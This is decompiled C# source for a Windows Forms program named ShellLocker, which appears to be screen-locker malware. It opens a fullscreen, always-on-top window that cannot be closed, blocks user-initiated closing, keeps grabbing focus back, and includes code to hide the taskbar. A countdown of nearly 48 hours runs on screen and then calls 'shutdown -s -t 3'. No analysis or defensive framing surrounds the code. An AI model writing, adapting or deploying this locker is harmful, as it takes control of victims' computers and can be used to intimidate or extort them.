using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ShellLocker;

[DesignerGenerated]
public class Form1 : Form
{
	public const int VK_LWIN = 91;

	public const int KEYEVENTF_KEYUP = 2;

	private int i;

	private int i2;

	private int i3;

	private int i4;

	private int i5;

	private string Location;

	private const int SETDESKWALLPAPER = 20;

	private const int UPDATEINIFILE = 1;

	private RichTextBox erhaltenerText;

	private string path1;

	private string path2;

	private object userDir;

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer2
	{
		[CompilerGenerated]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			Timer timer = _Timer2;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			timer = _Timer2;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label10")]
	internal virtual Label Label10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label11")]
	internal virtual Label Label11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label13")]
	internal virtual Label Label13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label12")]
	internal virtual Label Label12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form1()
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).add_LostFocus((EventHandler)Form1_LostFocus);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		InitializeComponent();
	}

	[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	[DllImport("User32", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern void SetWindowPos(int hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, int wFlags);

	public void TaskBarVisible(bool Visible)
	{
		string lpClassName = "Shell_TrayWnd";
		string lpWindowName = "";
		int hWnd = FindWindow(ref lpClassName, ref lpWindowName);
		if (Visible)
		{
			SetWindowPos(hWnd, 0, 0, 0, 0, 0, 64);
		}
		else
		{
			SetWindowPos(hWnd, 0, 0, 0, 0, 0, 128);
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void keybd_event(byte bVk, byte bScan, long dwFlags, long dwExtraInfo);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(int vkey);

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private void Form1_LostFocus(object sender, EventArgs e)
	{
		((Control)this).Focus();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		((Control)this).BringToFront();
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		Label13.set_Text(Conversions.ToString(Conversions.ToDouble(Label13.get_Text()) - 1.0));
		if (Conversions.ToDouble(Label13.get_Text()) == 10.0)
		{
			((Control)Label13).set_ForeColor(Color.Red);
		}
		if (Conversions.ToDouble(Label13.get_Text()) == 0.0)
		{
			((Control)Label13).set_ForeColor(Color.White);
			Label10.set_Text(Conversions.ToString(Conversions.ToDouble(Label10.get_Text()) - 1.0));
			Label13.set_Text(Conversions.ToString(59));
		}
		if (Conversions.ToDouble(Label10.get_Text()) == 10.0)
		{
			((Control)Label10).set_ForeColor(Color.Red);
		}
		if (Conversions.ToDouble(Label10.get_Text()) == 0.0)
		{
			((Control)Label10).set_ForeColor(Color.White);
			Label8.set_Text(Conversions.ToString(Conversions.ToDouble(Label8.get_Text()) - 1.0));
			Label10.set_Text(Conversions.ToString(59));
		}
		if (Conversions.ToDouble(Label8.get_Text()) == 10.0)
		{
			((Control)Label8).set_ForeColor(Color.Red);
		}
		if (Conversions.ToDouble(Label8.get_Text()) == 0.0)
		{
			((Control)Label13).set_ForeColor(Color.White);
			Interaction.Shell("shutdown -s -t 3", (AppWinStyle)2, false, -1);
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_0161: Expected O, but got Unknown
		//IL_020f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0219: Expected O, but got Unknown
		//IL_02c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d1: Expected O, but got Unknown
		//IL_037f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0389: Expected O, but got Unknown
		//IL_0437: Unknown result type (might be due to invalid IL or missing references)
		//IL_0441: Expected O, but got Unknown
		//IL_05de: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e8: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Timer1 = new Timer(components);
		PictureBox1 = new PictureBox();
		Timer2 = new Timer(components);
		Label8 = new Label();
		Label10 = new Label();
		Label11 = new Label();
		Label13 = new Label();
		Label12 = new Label();
		GroupBox1 = new GroupBox();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)GroupBox1).SuspendLayout();
		((Control)this).SuspendLayout();
		Timer1.set_Interval(1);
		((Control)PictureBox1).set_Location(new Point(0, -11));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(10, 10));
		PictureBox1.set_TabIndex(17);
		PictureBox1.set_TabStop(false);
		Timer2.set_Enabled(true);
		Timer2.set_Interval(1000);
		((Control)Label8).set_Anchor((AnchorStyles)3);
		((Control)Label8).set_BackColor(Color.Transparent);
		Label8.set_FlatStyle((FlatStyle)0);
		((Control)Label8).set_Font(new Font("Arial", 40f, (FontStyle)1));
		((Control)Label8).set_ForeColor(Color.White);
		((Control)Label8).set_Location(new Point(264, 14));
		((Control)Label8).set_Name("Label8");
		((Control)Label8).set_Size(new Size(87, 63));
		((Control)Label8).set_TabIndex(26);
		Label8.set_Text("47");
		Label8.set_TextAlign((ContentAlignment)64);
		((Control)Label10).set_Anchor((AnchorStyles)3);
		((Control)Label10).set_BackColor(Color.Transparent);
		Label10.set_FlatStyle((FlatStyle)0);
		((Control)Label10).set_Font(new Font("Arial", 40f, (FontStyle)1));
		((Control)Label10).set_ForeColor(Color.White);
		((Control)Label10).set_Location(new Point(397, 14));
		((Control)Label10).set_Name("Label10");
		((Control)Label10).set_Size(new Size(87, 63));
		((Control)Label10).set_TabIndex(27);
		Label10.set_Text("59");
		Label10.set_TextAlign((ContentAlignment)32);
		((Control)Label11).set_Anchor((AnchorStyles)3);
		((Control)Label11).set_BackColor(Color.Transparent);
		Label11.set_FlatStyle((FlatStyle)0);
		((Control)Label11).set_Font(new Font("Arial", 30f, (FontStyle)1));
		((Control)Label11).set_ForeColor(Color.White);
		((Control)Label11).set_Location(new Point(357, 26));
		((Control)Label11).set_Name("Label11");
		((Control)Label11).set_Size(new Size(34, 46));
		((Control)Label11).set_TabIndex(28);
		Label11.set_Text(":");
		Label11.set_TextAlign((ContentAlignment)32);
		((Control)Label13).set_Anchor((AnchorStyles)3);
		((Control)Label13).set_BackColor(Color.Transparent);
		Label13.set_FlatStyle((FlatStyle)0);
		((Control)Label13).set_Font(new Font("Arial", 40f, (FontStyle)1));
		((Control)Label13).set_ForeColor(Color.White);
		((Control)Label13).set_Location(new Point(530, 14));
		((Control)Label13).set_Name("Label13");
		((Control)Label13).set_Size(new Size(87, 63));
		((Control)Label13).set_TabIndex(29);
		Label13.set_Text("59");
		Label13.set_TextAlign((ContentAlignment)16);
		((Control)Label12).set_Anchor((AnchorStyles)3);
		((Control)Label12).set_BackColor(Color.Transparent);
		Label12.set_FlatStyle((FlatStyle)0);
		((Control)Label12).set_Font(new Font("Arial", 30f, (FontStyle)1));
		((Control)Label12).set_ForeColor(Color.White);
		((Control)Label12).set_Location(new Point(490, 26));
		((Control)Label12).set_Name("Label12");
		((Control)Label12).set_Size(new Size(34, 46));
		((Control)Label12).set_TabIndex(30);
		Label12.set_Text(":");
		Label12.set_TextAlign((ContentAlignment)32);
		((Control)GroupBox1).set_Anchor((AnchorStyles)12);
		((Control)GroupBox1).set_BackColor(Color.Transparent);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label8);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label12);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label10);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label13);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label11);
		((Control)GroupBox1).set_ForeColor(Color.Transparent);
		((Control)GroupBox1).set_Location(new Point(219, 531));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Size(new Size(859, 85));
		((Control)GroupBox1).set_TabIndex(31);
		GroupBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(1302, 766));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)GroupBox1).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}
}
